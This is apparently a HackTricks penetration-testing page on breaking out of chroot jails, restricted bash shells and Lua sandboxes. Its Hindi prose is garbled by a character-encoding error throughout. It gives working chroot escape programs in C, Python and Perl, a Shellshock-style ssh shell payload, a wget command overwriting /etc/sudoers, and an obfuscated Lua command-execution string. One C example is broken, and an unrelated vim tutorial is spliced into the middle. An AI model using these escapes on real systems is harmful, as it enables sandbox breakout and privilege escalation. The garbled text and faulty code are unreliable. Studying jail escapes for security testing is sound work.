# рдЬреЗрд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

## **GTFOBins**

**рдЦреЛрдЬреЗрдВ** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **рдореЗрдВ рдХреНрдпрд╛ рдЖрдк "рд╢реИрд▓" рдЧреБрдгрдзрд░реНрдо рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**

## Chroot рдЫреБрдЯрдХрд╛рд░рд╛

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) рд╕реЗ: рдЪрд░рдгрдмрджреНрдз рддрдВрддреНрд░ **рдЧреЛрдкрдиреАрдпрддрд╛** рдХреЗ рдЦрд┐рд▓рд╛рдл рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд╣реИред рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, chroot рд╕рдВрджрд░реНрдн рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реНрдЯреИрдХ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реЗ chrooted рдХрд╛рд░реНрдпрдХреНрд░рдо рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░рд╛ chroot рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдорддреМрд░ рдкрд░ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ chroot рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

{% hint style="success" %}
**рдЯреВрд▓** [**chw00t**](https://github.com/earthquake/chw00t) рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдФрд░ `chroot` рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред
{% endhint %}

### рд░реВрдЯ + CWD

{% hint style="warning" %}
рдпрджрд┐ рдЖрдк рдПрдХ рдЪрд░рдгрдмрджреНрдз рдореЗрдВ **рд░реВрдЯ** рд╣реИрдВ рддреЛ рдЖрдк **рдПрдХ рдФрд░ рдЪрд░рдгрдмрджреНрдз** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЗрд╕рд▓рд┐рдП рдХрд┐ 2 рдЪрд░рдгрдмрджреНрдз (рд▓рд┐рдирдХреНрд╕ рдореЗрдВ) рд╕рд╛рде рдореЗрдВ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдирдП рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рдПрдХ рдирдпрд╛ chroot рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЖрдк рдЙрд╕рдХреЗ рдмрд╛рд╣рд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрдм **рдирдП chroot рдХреЗ рдмрд╛рд╣рд░** рд╣реЛрдВрдЧреЗ рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк FS рдореЗрдВ рд╣реЛрдВрдЧреЗред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдорддреМрд░ рдкрд░ chroot рдЖрдкрдХреА рдХрд╛рд░реНрдпрд╢рд╛рд▓рд╛ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдПрдХ chroot рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЙрд╕рдХреЗ рдмрд╛рд╣рд░ рд╣реЛрдВрдЧреЗред
{% endhint %}

рдЖрдорддреМрд░ рдкрд░ рдЖрдк рдПрдХ рдЪрд░рдгрдмрджреНрдз рдЬреЗрд▓ рдореЗрдВ `chroot` рдмрд╛рдЗрдирд░реА рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдк **рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХрдВрдкрд╛рдЗрд▓, рдЕрдкрд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>рдкрд░реНрд▓</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### рд░реВрдЯ + рд╕рд╣реЗрдЬреЗ рдЧрдП рдПрдлрдбреА

{% hint style="warning" %}
рдпрд╣ рдкрд┐рдЫрд▓реЗ рдорд╛рдорд▓реЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдбреЗрд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХреЛ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдлрд┐рд░ **рдирдП рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ chroot рдмрдирд╛рддрд╛ рд╣реИ**ред рдЕрдВрдд рдореЗрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдЙрд╕реЗ рдЪреВрд░реНрдг рдореЗрдВ рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ **FD** рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ, рд╡рд╣ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд╣ **рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддрд╛ рд╣реИ**ред
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### рд░реВрдЯ + рдлреЛрд░реНрдХ + рдпреВрдбреАрдПрд╕ (рдпреВрдирд┐рдХреНрд╕ рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯреНрд╕)

{% hint style="warning" %}
рдПрдлрдбреА рдпреВрдирд┐рдХреНрд╕ рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП:

* рдПрдХ рдмрдЪреНрдЪрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдПрдВ (рдлреЛрд░реНрдХ)
* рдмрдЪреНрдЪреЗ рдФрд░ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХреЛ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпреВрдбреАрдПрд╕ рдмрдирд╛рдПрдВ
* рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЪреВрдХ рдЪрд▓рд╛рдПрдВ рдПрдХ рдЕрд▓рдЧ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ
* рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ, рдирдП рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪреВрдХ рдХреЗ рдмрд╛рд╣рд░ рдХреЗ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рдПрдлрдбреА рдмрдирд╛рдПрдВ
* рдпреВрдбреАрдПрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдПрдлрдбреА рдХреЛ рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрд╛рд╕ рдХрд░реЗрдВ
* рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрд╕ рдПрдлрдбреА рдореЗрдВ рдЪрд┐рдбрд╝рд┐рдпрд╛рдШрд░ рдХрд░реЗрдВ, рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрд╕рдХреЗ рдЪреВрдХ рдХреЗ рдмрд╛рд╣рд░ рд╣реИ, рд╡рд╣ рдЬреЗрд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдПрдЧрд╛
{% endhint %}

### &#x20;рд░реВрдЯ + рдорд╛рдЙрдВрдЯ

{% hint style="warning" %}
* рд░реВрдЯ рдЙрдкрдХрд░рдг (/) рдХреЛ рдЪреВрдХ рдХреЗ рднреАрддрд░ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ
* рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЪреВрдХ рдХрд░реЗрдВ

рдпрд╣ рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рдВрднрд╡ рд╣реИ
{% endhint %}

### рд░реВрдЯ + /proc

{% hint style="warning" %}
* рдЪреВрдХ рдХреЗ рднреАрддрд░ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ procfs рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ (рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рдирд╣реАрдВ рд╣реИ)
* рдПрдХ рдкрд┐рдбреА рдвреВрдВрдврд╝реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЕрд▓рдЧ рд░реВрдЯ/рд╕реАрдбрдмреНрд▓реНрдпреВрдбреА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╣реИ, рдЬреИрд╕реЗ: /proc/1/root
* рдЙрд╕ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдореЗрдВ рдЪреВрдХ рдХрд░реЗрдВ
{% endhint %}

### рд░реВрдЯ(?) + рдлреЛрд░реНрдХ

{% hint style="warning" %}
* рдПрдХ рдлреЛрд░реНрдХ рдмрдирд╛рдПрдВ (рдмрдЪреНрдЪрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛) рдФрд░ рдПрдлрдПрд╕ рдореЗрдВ рдПрдХ рдЕрд▓рдЧ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЪреВрдХ рдХрд░реЗрдВ рдФрд░ рдЙрд╕ рдкрд░ рд╕реАрдбреА рдХрд░реЗрдВ
* рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ, рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЪреВрдХ рдХреЗ рдкрд╣рд▓реЗ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЬрд╣рд╛рдВ рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ, рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдореВрд╡ рдХрд░реЗрдВ
* рдпрд╣ рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪреВрдХ рдХреЗ рдмрд╛рд╣рд░ рд╣реЛрдЧрд╛
{% endhint %}

### рдкреАрдЯреНрд░реЗрд╕

{% hint style="warning" %}
* рдХреБрдЫ рд╕рдордп рдкрд╣рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЕрдкрдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдбреАрдмрдЧ рдХрд░ рд╕рдХрддрд╛ рдерд╛... рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдм рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ
* рдлрд┐рд░ рднреА, рдпрджрд┐ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ, рддреЛ рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреАрдЯреНрд░реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рднреАрддрд░ рдПрдХ рд╢реИрд▓рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ ([рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рджреЗрдЦреЗрдВ](linux-capabilities.md#cap\_sys\_ptrace))ред
{% endhint %}

## рдмреИрд╢ рдЬреЗрд▓

### рдЬрд╛рдБрдЪ

рдЬреЗрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### рдкрд╛рде (PATH) рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкрд╛рде (PATH) env рдЪрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### рд╡рд┐рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рд╡рд┐рдо рдПрдХ рдкрд╛рда рд╕рдВрдкрд╛рджрдХ рд╣реИ рдЬрд┐рд╕реЗ рд▓рд┐рдирдХреНрд╕ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╕рдВрдкрд╛рджрдХ рд╣реИ рдЬреЛ рдХрдИ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЖрддрд╛ рд╣реИред рд╡рд┐рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдирдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕рдВрдкрд╛рджрди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд┐рдо рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
vim <рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо>
```

рд╡рд┐рдо рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреБрдВрдЬреАрдмреЛрд░реНрдб рд╢реЙрд░реНрдЯрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
- `h` - рдмрд╛рдИрдВ рдУрд░ рдЬрд╛рдПрдВ
- `j` - рдиреАрдЪреЗ рдЬрд╛рдПрдВ
- `k` - рдКрдкрд░ рдЬрд╛рдПрдВ
- `l` - рджрд╛рдИрдВ рдУрд░ рдЬрд╛рдПрдВ

рд╡рд┐рдо рдореЗрдВ рд╕рдВрдкрд╛рджрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреБрдВрдЬреАрдмреЛрд░реНрдб рд╢реЙрд░реНрдЯрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
- `i` - рдЗрдВрд╕рд░реНрдЯ рдореЛрдб рдореЗрдВ рдЬрд╛рдПрдВ
- `Esc` - рдЗрдВрд╕рд░реНрдЯ рдореЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ
- `:w` - рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╣реЗрдЬреЗрдВ
- `:q` - рд╡рд┐рдо рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓реЗрдВ

рд╡рд┐рдо рдореЗрдВ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП, рдЖрдк рд╡рд┐рдо рдХреА рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╡рд┐рдо рдХреА рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
vimtutor
```

рд╡рд┐рдо рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рд╕рдВрдкрд╛рджрдХ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рдЕрд╡рд╢реНрдп рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рдЕрдкрдиреЗ рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛрдВрдЧреЗред
```bash
:set shell=/bin/sh
:shell
```
### рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдПрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк _/bin/bash_ рдХреЛ рд╕рд╛рдордЧреНрд░реА рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЦрдХрд░ рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH рд╕реЗ рдмреИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдк SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк рдмреИрд╢ рд╢реИрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### рдШреЛрд╖рд┐рдд рдХрд░реЗрдВ
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП sudoers рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### рдЕрдиреНрдп рдЪрд╛рд▓реЗрдВ

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**рдпрд╣ рдкреГрд╖реНрда рднреА рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python рдЬреЗрд▓

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ Python рдЬреЗрд▓ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рддрд░реАрдХреЗ рд╣реИрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua рдЬреЗрд▓

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдкрдХреЛ рд▓реБрдЖ рдХреЗ рднреАрддрд░ рдЖрдкрдХреЗ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рд╡реИрд╢реНрд╡рд┐рдХ рдлрд╝рдВрдХреНрд╢рди рдорд┐рд▓реЗрдВрдЧреЗ: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**рдХрдорд╛рдВрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рд╛рде рдЗрд╡реИрд▓:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
рдХреБрдЫ рдЯреНрд░рд┐рдХреНрд╕ **рдбреЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
for k,v in pairs(string) do print(k,v) end
```
